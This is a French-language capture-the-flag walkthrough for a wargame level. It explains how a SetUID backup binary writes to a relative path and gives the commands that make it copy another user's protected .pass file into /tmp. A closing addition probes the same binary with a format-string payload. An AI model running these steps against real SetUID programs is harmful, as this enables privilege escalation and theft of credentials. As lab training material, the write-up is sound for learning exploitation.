### 1\. Analyse du binaire

Le programme est un utilitaire de sauvegarde (`backups`). Voici son fonctionnement logique :

1.  Il prend un nom de fichier en argument (`argv[1]`).
2.  Il écrit des logs dans `./backups/.log`.
3.  Il tente d'ouvrir le fichier source en lecture.
4.  Il crée une copie de ce fichier dans `./backups/[chemin_du_fichier]`.

**La faille :** Le binaire est **SetUID level09**, ce qui lui permet de lire n'importe quel fichier appartenant à `level09` (comme le `.pass`). De plus, il utilise un chemin **relatif** (`./backups/`) pour écrire sa copie.

* * *

### 2\. Stratégie d'exploitation

Puisque le programme utilise `./backups/` (relatif au répertoire courant), nous pouvons le forcer à écrire dans un dossier que nous contrôlons.

-   **Cible :** `/home/users/level09/.pass`
-   **Destination voulue par le binaire :** `./backups//home/users/level09/.pass`

Nous allons nous placer dans `/tmp`, y recréer l'arborescence de dossiers nécessaire, et laisser le binaire faire la copie pour nous.

* * *

### 3\. Les Commandes de Résolution

Suis ces étapes précisément depuis ton terminal :

#### Étape 1 : Préparation dans /tmp

On se place dans un répertoire où on a tous les droits et on crée la structure de dossiers que le binaire s'attend à trouver.

Bash

```
cd /tmp
mkdir -p backups/home/users/level09
```

#### Étape 2 : Exécution de l'exploit

On lance le binaire (avec son chemin absolu) en lui donnant la cible. **Important :** Il faut rester dans `/tmp` pour que `./backups` pointe vers ton nouveau dossier.

Bash

```
~/level08 /home/users/level09/.pass
```

#### Étape 3 : Récupération du flag

Le binaire, grâce à ses droits SUID, a lu le fichier protégé et en a déposé une copie dans ton dossier `/tmp/backups/...`.

Bash

```
cat /tmp/backups/home/users/level09/.pass
```

autre failles ici 

cd /tmp
mkdir -p backups
~/level08 "%p.%p.%p.%p.%p.%p.%p.%p"
cat backups/.log